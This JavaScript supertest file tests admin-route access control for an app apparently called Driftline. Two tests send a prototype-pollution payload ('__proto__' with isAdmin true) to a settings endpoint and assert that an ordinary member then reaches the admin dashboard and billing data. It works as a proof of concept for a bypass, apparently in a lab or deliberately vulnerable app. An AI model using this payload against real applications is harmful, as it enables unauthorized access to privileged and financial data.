const request = require('supertest')
const { newTestApp, loginAs, sendRawJson } = require('./helpers')

describe('admin routes: gated correctly, bypassed correctly', () => {
  let app

  beforeEach(() => {
    app = newTestApp()
  })

  test('admin dashboard requires owner role', async () => {
    const cookie = await loginAs(app, 'alice@driftline.local', 'password123')
    const res = await request(app).get('/admin').set('Cookie', cookie)
    expect(res.status).toBe(403)
  })

  test('billing requires owner role', async () => {
    const cookie = await loginAs(app, 'bob@driftline.local', 'password456')
    const res = await request(app).get('/admin/billing').set('Cookie', cookie)
    expect(res.status).toBe(403)
  })

  test('admin routes require auth entirely', async () => {
    const res = await request(app).get('/admin')
    expect(res.status).toBe(401)
  })

  test('a polluted member reaches the admin dashboard', async () => {
    const cookie = await loginAs(app, 'alice@driftline.local', 'password123')
    await sendRawJson(
      request(app).patch('/api/settings').set('Cookie', cookie),
      '{"__proto__":{"isAdmin":true}}'
    )
    const res = await request(app).get('/admin').set('Cookie', cookie)
    expect(res.status).toBe(200)
  })

  test('a polluted member retrieves the actual billing data', async () => {
    const cookie = await loginAs(app, 'alice@driftline.local', 'password123')
    await sendRawJson(
      request(app).patch('/api/settings').set('Cookie', cookie),
      '{"__proto__":{"isAdmin":true}}'
    )
    const res = await request(app).get('/admin/billing').set('Cookie', cookie)
    expect(res.status).toBe(200)
    expect(res.text).toMatch(/4242/)
  })

  test('the real owner reaches both admin routes normally', async () => {
    const db = app.locals.db
    db.prepare("UPDATE users SET role = 'owner' WHERE email = ?").run('bob@driftline.local')
    const cookie = await loginAs(app, 'bob@driftline.local', 'password456')
    const adminRes = await request(app).get('/admin').set('Cookie', cookie)
    const billingRes = await request(app).get('/admin/billing').set('Cookie', cookie)
    expect(adminRes.status).toBe(200)
    expect(billingRes.status).toBe(200)
  })
})
